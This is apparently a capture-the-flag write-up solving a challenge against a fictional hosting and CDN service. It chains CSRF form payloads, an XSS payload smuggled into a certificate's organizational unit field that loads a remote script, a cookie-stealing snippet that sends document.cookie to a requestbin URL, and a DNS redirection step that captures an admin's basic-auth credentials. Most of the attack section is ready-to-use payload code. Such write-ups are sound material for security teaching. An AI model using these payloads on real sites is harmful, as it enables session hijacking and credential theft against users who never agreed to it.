This challenge was preforming CSRF and XSS attacks on a user to gain control of their CDN/proxy settings and MitM their credentials for their hosting service. 


I will be using user id 2 and `test.hosting.pwn.republican`. Substitute your own.


There are 3 steps:
- View the admin's private SSL certificate email (You might not know you need this until you did step 2)
- Steal the admin's CDN cookie and log in as them
- MitM the admin's hosting control panel


1.
Request `voteforme.hosting.pwn.republican` as your error domain.


Send this CSRF payload on the voteforme form:
```
<form id="pwn" action="https://tld.hosting.pwn.republican/manage" method="POST">
<input name="name" value="voteforme.hosting.pwn.republican">
<input name="userid" value="2">
<input name="allow" value="">
</form>
<script>document.getElementById("pwn").submit();</script>
```

Record the email you see in the domain:
`Sup3r_P4k_d0L13rs@polihost.hosting.pwn.republican`


2.
Create the XSS payload in the Certificate


Create a CSR with 
`openssl req -out csr -new -newkey rsa:2048 -nodes -keyout key`
Have the common name be `test.hosting.pwn.republican`, and the organizational unit be this XSS payload:
`"><svg onload="$.getScript('https:\x2f\x2fexample.com\x2fp.js')">`


Create a https server with a self signed certificate and use the TLD site to sign the CSR.



Send this CSRF payload to give the target our XSS payload
```
<form id="pwn" action="https://tld.hosting.pwn.republican/manage" method="POST">
<input name="errorname" value="test">
<input name="adderror" value="">
</form>
<script>document.getElementById("pwn").submit();</script>
```


On our XSS script source set up something to steal the cookie. ie requestbin
```
var i = document.createElement("img");
i.src = "http://requestb.in/1mju3gg1?cookie="+encodeURIComponent(document.cookie);
```


Send this payload to make the target trigger our XSS
```
<script>location="https://tld.hosting.pwn.republican/manage";</script>
```


Check requestbin and login with the target's cookie. It will ask for confirmation, so give the email recorded before.


3.
MitM the admin panel

Now we can view and edit the secret domain the admin uses.


Record the real ip of the admin panel, and then change login domain's IP to your server and sign a CSR for it.


Send a message to the admin and he will visit this site with his basicauth headers, which you can record.


Now you can log into the real admin panel with the username and password and get the flag.
